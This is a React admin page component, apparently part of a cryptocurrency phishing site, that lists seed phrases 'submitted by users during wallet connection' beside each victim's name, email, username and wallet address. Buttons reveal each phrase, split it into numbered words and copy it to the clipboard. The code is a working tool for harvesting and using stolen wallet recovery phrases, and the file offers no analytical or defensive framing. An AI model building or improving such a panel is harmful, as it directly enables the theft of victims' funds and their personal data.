"use client";

import { useEffect, useState } from "react";
import { Wallet, Copy, Check, Eye, EyeOff, RefreshCw, Search } from "lucide-react";

interface WalletEntry {
  id: string;
  method: string;
  userWalletAddress: string | null;
  seedPhrase: string | null;
  createdAt: string;
  user: {
    id: string;
    name: string;
    email: string;
    username: string;
  };
}

export default function WalletPhrasesPage() {
  const [entries, setEntries] = useState<WalletEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [visiblePhrases, setVisiblePhrases] = useState<Set<string>>(new Set());
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const fetchData = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/admin/wallet-phrases");
      const data = await res.json();
      setEntries(data.walletConnections ?? []);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
  }, []);

  const togglePhrase = (id: string) => {
    setVisiblePhrases((prev) => {
      const next = new Set(prev);
      next.has(id) ? next.delete(id) : next.add(id);
      return next;
    });
  };

  const copyPhrase = (id: string, phrase: string) => {
    navigator.clipboard.writeText(phrase);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const filtered = entries.filter((e) => {
    const q = search.toLowerCase();
    return (
      e.user.email.toLowerCase().includes(q) ||
      e.user.name.toLowerCase().includes(q) ||
      e.user.username.toLowerCase().includes(q) ||
      e.method.toLowerCase().includes(q)
    );
  });

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-white">Wallet Phrases</h1>
          <p className="text-gray-500 text-sm mt-1">
            Seed phrases submitted by users during wallet connection
          </p>
        </div>
        <button
          onClick={fetchData}
          className="flex items-center gap-2 px-3 py-2 rounded-xl bg-white/5 border border-white/10
            text-gray-400 hover:text-white hover:bg-white/10 transition-all text-sm"
        >
          <RefreshCw size={14} className={loading ? "animate-spin" : ""} />
          Refresh
        </button>
      </div>

      {/* Search */}
      <div className="relative">
        <Search size={15} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500" />
        <input
          type="text"
          placeholder="Search by name, email, username or wallet..."
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          className="w-full pl-10 pr-4 py-3 rounded-xl bg-[#111] border border-white/10 text-white
            text-sm placeholder-gray-600 focus:outline-none focus:border-red-700/50"
        />
      </div>

      {/* Stats */}
      <div className="px-5 py-3 rounded-xl bg-[#111] border border-white/8 flex items-center gap-3">
        <Wallet size={16} className="text-red-400" />
        <span className="text-sm text-gray-400">
          <span className="text-white font-bold">{entries.length}</span> wallet connection{entries.length !== 1 ? "s" : ""} with seed phrases
        </span>
      </div>

      {/* Table */}
      {loading ? (
        <div className="flex items-center justify-center h-40">
          <div className="w-8 h-8 border-2 border-red-600 border-t-transparent rounded-full animate-spin" />
        </div>
      ) : filtered.length === 0 ? (
        <div className="text-center py-16 text-gray-600">
          <Wallet size={32} className="mx-auto mb-3 opacity-30" />
          <p className="text-sm">No wallet phrases found</p>
        </div>
      ) : (
        <div className="space-y-3">
          {filtered.map((entry) => {
            const isVisible = visiblePhrases.has(entry.id);
            const isCopied = copiedId === entry.id;
            return (
              <div
                key={entry.id}
                className="bg-[#111] border border-white/8 rounded-2xl p-5 space-y-4"
              >
                {/* User info */}
                <div className="flex items-start justify-between gap-4">
                  <div>
                    <p className="text-white font-semibold text-sm">{entry.user.name}</p>
                    <p className="text-gray-500 text-xs">{entry.user.email}</p>
                    <p className="text-gray-600 text-xs">@{entry.user.username}</p>
                  </div>
                  <div className="text-right">
                    <span className="px-2.5 py-1 rounded-lg bg-red-950/50 border border-red-900/40 text-red-400 text-xs font-semibold">
                      {entry.method}
                    </span>
                    <p className="text-gray-600 text-xs mt-1.5">
                      {new Date(entry.createdAt).toLocaleString()}
                    </p>
                  </div>
                </div>

                {/* Wallet address */}
                {entry.userWalletAddress && (
                  <div className="px-3 py-2 rounded-lg bg-black/30 border border-white/5">
                    <p className="text-[10px] text-gray-600 uppercase tracking-wider mb-1">Wallet Address</p>
                    <code className="text-xs text-gray-400 font-mono break-all">{entry.userWalletAddress}</code>
                  </div>
                )}

                {/* Seed phrase */}
                <div className="px-3 py-3 rounded-lg bg-red-950/20 border border-red-900/30">
                  <div className="flex items-center justify-between mb-2">
                    <p className="text-[10px] text-red-400 uppercase tracking-wider font-semibold">Seed Phrase</p>
                    <div className="flex items-center gap-2">
                      <button
                        onClick={() => togglePhrase(entry.id)}
                        className="flex items-center gap-1.5 text-xs text-gray-500 hover:text-white transition-colors"
                      >
                        {isVisible ? <EyeOff size={13} /> : <Eye size={13} />}
                        {isVisible ? "Hide" : "Show"}
                      </button>
                      <button
                        onClick={() => copyPhrase(entry.id, entry.seedPhrase!)}
                        className="flex items-center gap-1.5 text-xs text-gray-500 hover:text-green-400 transition-colors"
                      >
                        {isCopied ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
                        {isCopied ? "Copied!" : "Copy"}
                      </button>
                    </div>
                  </div>
                  <code className="text-sm text-white font-mono break-all leading-relaxed">
                    {isVisible
                      ? entry.seedPhrase
                      : "•".repeat((entry.seedPhrase?.length ?? 20))}
                  </code>
                  {isVisible && (
                    <div className="flex flex-wrap gap-1.5 mt-3">
                      {entry.seedPhrase?.split(/\s+/).map((word, i) => (
                        <span
                          key={i}
                          className="px-2 py-1 rounded-md bg-black/40 border border-white/10 text-xs text-gray-300 font-mono"
                        >
                          <span className="text-gray-600 mr-1">{i + 1}.</span>{word}
                        </span>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}
